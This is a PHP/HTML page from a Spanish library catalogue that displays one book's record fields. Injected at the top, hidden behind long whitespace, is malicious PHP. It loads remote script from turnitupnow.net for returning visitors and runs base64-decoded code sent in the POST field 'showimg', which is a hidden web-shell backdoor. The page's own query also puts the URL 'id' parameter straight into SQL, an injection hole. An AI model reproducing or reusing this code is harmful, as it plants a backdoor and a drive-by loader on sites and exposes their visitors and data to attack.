<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="resources/estilos.css" rel="stylesheet" type="text/css">

				  <style type="text/css">
<!--
body {
	background-color: #F8F8F8;
}
-->
                  </style>
<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 
include_once("bdd.php");
$id = $_GET['id'];
$result = $db->Execute("SELECT * FROM CDL_completa WHERE nregistro = $id");
	
		 $codcen = $result->fields[1];
		 $codlib = $result->fields[2];; 
		 $nregistro = $result->fields[3];
		 $titulo = $result->fields[4]; 
		 $signatura = $result->fields[5];
		 $seccion = $$result->fields[6]; 
		 $armario = $result->fields[7];
		 $fila = $result->fields[8]; 
		 $codprop = $result->fields[9];
		 $propdon = $result->fields[10]; 
		 $cantidad = $result->fields[11];
		 $adquiridos = $result->fields[12]; 
		 $libres = $result->fields[13];
		 $isbn = $result->fields[14]; 
		 $codcol = $result->fields[15];
		 $numcol = $result->fields[16]; 
		 $areaedic = $result->fields[17];
		 $codedit = $result->fields[18]; 
		 $localidad = $result->fields[19];
		 $apublica = $result->fields[20]; 
		 $descrfis = $result->fields[21];
		 $paginas = $result->fields[22]; 
		 $duracion = $result->fields[23];
		 $codtipmat = $result->fields[24]; 
		 $otros = $result->fields[25];
		 $comenta = $result->fields[26]; 
		 $falta = $result->fields[27];
		 $fbaja = $result->fields[28]; 
		 $mabja = $result->fields[29];
		 $iniciales = $result->fields[30]; 
		 $cdu1 = $result->fields[31];
		 $cdu2 = $result->fields[32];
		 $solousar = $result->fields[33]; 
		 $notas = $result->fields[34];
		 $areaed = $result->fields[35]; 
		 $niveled = $result->fields[36];
		 $volcol = $result->fields[37]; 
		 $codmat = $result->fields[38];
		 $codm008 = $result->fields[39]; 

?>

<table width="500" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="291" height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Datos del Libro</td>
                    </tr>
                  </table>
				  <table width="500" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                    <tr>
                      <td width="85" height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;codcen</td>
                      <td width="150" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($codcen) ?></label>
                      </strong></td>
                      <td width="92" bgcolor="#F8F8F8" class="texte_mini">&nbsp;codlib</td>
                      <td width="173" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($codlib) ?></strong></td>
                      <td width="173" bgcolor="#F8F8F8" class="texte_mini">nregistro</td>
                      <td width="173" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($nregistro) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;titulo</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($titulo) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;signatura</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($signatura) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">seccion</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($seccion) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;armario</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($armario) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;fila</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($fila) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">codprop</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($codprop) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;propdon</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($propdon) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;cantidad</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($cantidad) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">adquiridos</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($adquiridos) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;libres</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($libres) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;isbn</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($isbn) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">codcol</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($codcol) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;numcol</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($numcol) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;areaedic</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($areaedic) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">codedit</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($codedit) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;localidad</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($localidad) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;apublica</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($apublica) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">descrfis</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($descrfis) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;paginas</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($paginas) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;duracion</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($duracion) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">codtipmat</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($codtipmat) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;otros</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($otros) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;comenta</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($comenta) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">falta</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($falta) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;fbaja</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($fbaja) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;mabja</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($mabja) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">iniciales</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($iniciales) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;cdu1</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                      <label><?php echo utf8_encode($cdu1) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;cdu2</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($cdu2) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">solousar</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($solousar) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;areaed</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($areaed) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;niveled</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($niveled) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">volcol</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($volcol) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="20" bgcolor="#F8F8F8" class="texte_mini">&nbsp;codmat</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($codmat) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;codm008</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($codm008) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8">&nbsp;<span class="texte_mini">Notas/Apuntes</span></td>
                      <td colspan="5" align="left" bgcolor="#F8F8F8"><label>
                        <textarea name="notas" cols="60" rows="2" class="texte_mini" id="textfield14"><?php echo $notas ?></textarea>
                      </label></td>
                    </tr>
                  </table>
				  